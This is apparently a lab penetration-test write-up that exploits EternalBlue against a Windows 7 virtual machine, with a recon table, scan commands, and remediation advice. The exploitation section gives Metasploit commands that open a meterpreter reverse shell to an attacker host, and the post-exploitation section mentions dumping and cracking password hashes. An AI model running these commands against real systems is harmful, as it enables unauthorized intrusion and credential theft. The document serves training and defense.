# 🛡️ Offensive Security Project Report

**Target IP:** 192.168.153.130  
**Assessment Date:** May 30, 2025  
**Assessor:** mafioso  
**Environment:** VMware (Host-Only Network)

---

## 📌 1. Executive Summary

This vulnerability assessment was conducted on a host within a VMware virtual environment (IP: `192.168.153.130`). The host was running several potentially vulnerable services, including **SMB**, **NetBIOS**, and **HTTP**. Notably, the **SMB service (Port 445)** was exposed and found vulnerable to the **EternalBlue (CVE-2017-0143)** exploit.

This report documents the methodology, findings, exploitation process, and remediation steps for securing the system.

---

## 🧪 2. Methodology

The following phases and tools were used during the assessment:

| Phase | Tool/Command | Purpose |
|-------|--------------|---------|
| **Discovery** | `arp-scan -l` | Identify live hosts |
| **Port Scanning** | `nmap -sS -sV` | Discover open TCP ports and service versions |
| **Vulnerability Detection** | `nmap --script vuln` | Identify known vulnerabilities (CVEs) |
| **Exploitation** | `Metasploit Framework` | Controlled exploitation in lab |

---

## 🛠️ 3. Tools Used

- Nmap  
- Metasploit Framework  
- MSFconsole  
- Kali Linux  
- Exploit: EternalBlue (CVE-2017-0143)

---

## 🖥️ 4. Target Environment

- **Operating System**: Windows 7 SP1  
- **IP Address**: 192.168.153.130  
- **Network Setup**: Host-only network (VMware)  
- **Purpose**: Simulated vulnerable host for security testing

---

## 🔍 5. Reconnaissance and Scanning

### Network Discovery

bash
sudo arp-scan -l

## Arp scan screenshot

![Arp scan output](screenshots/arp-scan-results.png)


Port Scanning
bash
nmap -sS -sV -O 192.168.153.130

OS Detection: Microsoft Windows 7 SP1
Open Ports Identified:

>.135/tcp
>.139/tcp
>.445/tcp (SMB)
>.49152–49156/tcp (Dynamic RPC Ports)


##  Nmap port Scan Result

![Nmap Output](screenshots/nmap-port-scan.png)


### 6. Vulnerability Identification

Service: SMB (Port 445)
Vulnerability: CVE-2017-0143 – EternalBlue

Detection: Identified via nmap --script vuln and manual enumeration

Risk Level: HIGH

##  Vuln Scan Result

![vuln scan result](screenshots/vuln-scan-results.png)


###7. Exploitation Process

Step 1: Launch Metasploit Console

bash 
msfconsole

Step 2: Configure EternalBlue Exploit

bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.153.130
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST [attacker_IP]
run

Result
✅ Exploit Successful – Meterpreter session established
✅ Verified SYSTEM privileges

## 📸 Exploitation Screenshot

[Exploit Success](screenshots/exploit-successful.png)


### 8. Post-Exploitation

>.Verified OS version and hostname
>.Gathered network configuration details
>.Dumped and cracked  password hashes
>.Captured a flag from the target desktop (e.g., flag.txt)

## 📸 Post Exploitation Screenshot and hash dump

![Post exploit](screenshots/system-info.png)

## 📸 Further Exploitation Screenshot

![Exploit Success](screenshots/further-exploitation.png)

## 📸 Hash Craking Screenshot

![Hash crack Success](screenshots/hash-craking.png)

##  Compromised System Screenshot

![comprosed sysem Success](screenshots/compromised-system.png)

###9. Remediation Recommendations

>.Apply latest Windows security updates
>.Disable SMBv1 if not required
>.Use host firewalls to restrict access to port 445
>.Conduct regular vulnerability scans and patch assessments

###10. Lessons Learned

>.SMB services exposed on networks are high-risk targets
>.Patch management is critical to prevent known exploitations
>.Segmented and isolated networks improve containment of vulnerable systems


🔗 Resources
CVE-2017-0143 – MITRE
Rapid7 EternalBlue Module

Disclaimer: This project was conducted in a controlled lab environment for educational purposes only. Unauthorized testing on systems without permission is illegal and unethical.
